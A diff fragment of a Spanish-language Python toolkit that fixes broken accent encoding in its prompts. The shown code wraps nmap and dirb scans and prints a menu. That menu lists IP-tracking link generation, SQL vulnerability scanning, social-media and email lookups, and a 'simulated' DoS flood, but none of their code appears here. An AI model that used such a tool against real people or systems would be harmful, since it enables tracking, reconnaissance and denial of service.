+    ports = input(f"{AZUL}¿Especificar puertos? (ej: 22,80,1-1024) [enter = ninguno]: {RESET}").strip()
     if ports:
         flags.extend(["-p", ports])
 
-    sV = input(f"{AZUL}Detectar versiÃ³n de servicios (-sV)? [s/N]: {RESET}").strip().lower()
+    sV = input(f"{AZUL}Detectar versión de servicios (-sV)? [s/N]: {RESET}").strip().lower()
     if sV.startswith('s'):
         flags.append("-sV")
 
-    do_O = input(f"{AZUL}DetecciÃ³n de SO (-O)? [s/N]: {RESET}").strip().lower()
+    do_O = input(f"{AZUL}Detección de SO (-O)? [s/N]: {RESET}").strip().lower()
     if do_O.startswith('s'):
         flags.append("-O")
 
@@ -939,7 +933,7 @@ def scan_with_nmap():
     if do_Pn.startswith('s'):
         flags.append("-Pn")
 
-    print("\nVelocidad/timing (impacta detecciÃ³n y ruido):")
+    print("\nVelocidad/timing (impacta detección y ruido):")
     print("  1) T0  2) T1  3) T2  4) T3 (default)  5) T4  6) T5")
     timing = input(f"{AZUL}Elige 1-6 (enter=4): {RESET}").strip() or "4"
     timing_map = {"1":"-T0","2":"-T1","3":"-T2","4":"-T3","5":"-T4","6":"-T5"}
@@ -951,7 +945,7 @@ def scan_with_nmap():
         try:
             extra_list = shlex.split(extra)
         except ValueError:
-            print(f"{ROJO}Error al parsear opciones extra. Se ignorarÃ¡n.{RESET}")
+            print(f"{ROJO}Error al parsear opciones extra. Se ignorarán.{RESET}")
             extra_list = []
 
     save_file = input(f"{AZUL}Guardar salida en archivo (ej: salida.txt) [enter = no]: {RESET}").strip()
@@ -961,26 +955,26 @@ def scan_with_nmap():
 
     cmd = ["nmap"] + flags + extra_list + out_args + [target]
     print(f"\n{AZUL}Comando a ejecutar:{RESET} {' '.join(shlex.quote(x) for x in cmd)}")
-    confirm = input(f"{AZUL}Â¿Ejecutar ahora? [s/N]: {RESET}").strip().lower()
+    confirm = input(f"{AZUL}¿Ejecutar ahora? [s/N]: {RESET}").strip().lower()
     if not confirm.startswith('s'):
         print(f"{ROJO}Escaneo cancelado.{RESET}")
         return
 
     try:
         proc = subprocess.run(cmd, check=False)
-        print(f"\n{VERDE}Escaneo finalizado. CÃ³digo de salida: {proc.returncode}{RESET}")
+        print(f"\n{VERDE}Escaneo finalizado. Código de salida: {proc.returncode}{RESET}")
         if save_file:
             print(f"{VERDE}Salida guardada en: {save_file}{RESET}")
     except KeyboardInterrupt:
         print(f"\n{ROJO}Escaneo cancelado por usuario.{RESET}")
     except Exception as e:
-        print(f"{ROJO}OcurriÃ³ un error al ejecutar nmap: {e}{RESET}")
+        print(f"{ROJO}Ocurrió un error al ejecutar nmap: {e}{RESET}")
 
-# --- NUEVA FUNCIÃ“N: Escaneo con dirb preguntando parÃ¡metros ---
+# --- NUEVA FUNCIÓN: Escaneo con dirb preguntando parámetros ---
 def scan_with_dirb():
     target = input(f"{AZUL}[*] Ingresa la URL o dominio a escanear con dirb (ej. http://example.com): {RESET}").strip()
     if not target:
-        print(f"{ROJO}[!] Objetivo vacÃ­o. Cancelando.{RESET}")
+        print(f"{ROJO}[!] Objetivo vacío. Cancelando.{RESET}")
         return
 
     # Asegurar dirb (intenta instalar si falta)
@@ -989,7 +983,7 @@ def scan_with_dirb():
         return
 
     wordlist = input(f"{AZUL}[*] Ruta a wordlist (ej: /usr/share/wordlists/dirb/common.txt) [enter = none]: {RESET}").strip()
-    extra = input(f"{AZUL}[*] ParÃ¡metros extra para dirb (ej. -S -r) [enter = ninguno]: {RESET}").strip()
+    extra = input(f"{AZUL}[*] Parámetros extra para dirb (ej. -S -r) [enter = ninguno]: {RESET}").strip()
     cmd = ["dirb", target]
     if wordlist:
         cmd.append(wordlist)
@@ -1000,33 +994,33 @@ def scan_with_dirb():
             cmd.extend(extra.split())
 
     print(f"\n{AZUL}Comando a ejecutar:{RESET} {' '.join(shlex.quote(x) for x in cmd)}")
-    confirmar = input(f"{AZUL}Â¿Ejecutar dirb ahora? [s/N]: {RESET}").strip().lower()
+    confirmar = input(f"{AZUL}¿Ejecutar dirb ahora? [s/N]: {RESET}").strip().lower()
     if not confirmar.startswith('s'):
         print(f"{ROJO}Escaneo dirb cancelado.{RESET}")
         return
     try:
         subprocess.run(cmd)
     except Exception as e:
-        print(f"{ROJO}OcurriÃ³ un error al ejecutar dirb: {e}{RESET}")
+        print(f"{ROJO}Ocurrió un error al ejecutar dirb: {e}{RESET}")
 
-# --- MenÃº principal ---
+# --- Menú principal ---
 def show_menu():
     while True:
         print_banner()
-        print(f"{VERDE}MenÃº de Opciones:{RESET}")
+        print(f"{VERDE}Menú de Opciones:{RESET}")
         print(f"1. {AZUL}Buscar usuario en redes sociales{RESET}")
         print(f"2. {AZUL}Buscar correo en sitios populares{RESET}")
-        print(f"3. {AZUL}Rastrear direcciÃ³n IP{RESET}")
+        print(f"3. {AZUL}Rastrear dirección IP{RESET}")
         print(f"4. {AZUL}Escanear vulnerabilidad SQL{RESET}")
         print(f"5. {AZUL}Generar enlace de rastreo de IP{RESET}")
-        print(f"6. {AZUL}Realizar ataque de inundaciÃ³n (DoS) - SIMULACIÃ“N{RESET}")
-        print(f"7. {AZUL}Obtener informaciÃ³n de un sitio web{RESET}")
+        print(f"6. {AZUL}Realizar ataque de inundación (DoS) - SIMULACIÓN{RESET}")
+        print(f"7. {AZUL}Obtener información de un sitio web{RESET}")
         print(f"8. {AZUL}Instalar la herramienta (comando Fh){RESET}")
         print(f"9. {AZUL}Escanear con nmap{RESET}")
         print(f"10. {AZUL}Escanear con dirb{RESET}")
         print(f"11. {ROJO}Salir{RESET}")
 
-        choice = input(f"\n{AZUL}Selecciona una opciÃ³n (1-11): {RESET}")
+        choice = input(f"\n{AZUL}Selecciona una opción (1-11): {RESET}")
 
         if choice == '1':
             buscar_usuario()
@@ -1049,17 +1043,17 @@ def show_menu():
         elif choice == '10':
             scan_with_dirb()
         elif choice == '11':
-            print(f"\n{VERDE}[+] Â¡Gracias por usar la herramienta!{RESET}")
+            print(f"\n{VERDE}[+] ¡Gracias por usar la herramienta!{RESET}")
             sys.exit()
         else:
-            print(f"{ROJO}[!] OpciÃ³n invÃ¡lida. Intenta de nuevo.{RESET}")
+            print(f"{ROJO}[!] Opción inválida. Intenta de nuevo.{RESET}")
         
         input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
 
 # --- Punto de Entrada Principal ---
 if __name__ == "__main__":
     try:
-        # Asegurar mÃ³dulos Python crÃ­ticos al inicio para evitar errores silenciosos
+        # Asegurar módulos Python críticos al inicio para evitar errores silenciosos
         if requests is None:
             requests = ensure_python_package('requests', 'requests')
         if dns is None:
@@ -1068,7 +1062,7 @@ if __name__ == "__main__":
         create_sites_file()
         show_menu()
     except KeyboardInterrupt:
-        print(f"\n{ROJO}[!] InterrupciÃ³n por el usuario. Saliendo...{RESET}")
+        print(f"\n{ROJO}[!] Interrupción por el usuario. Saliendo...{RESET}")
         sys.exit(1)
 
 print(" ")
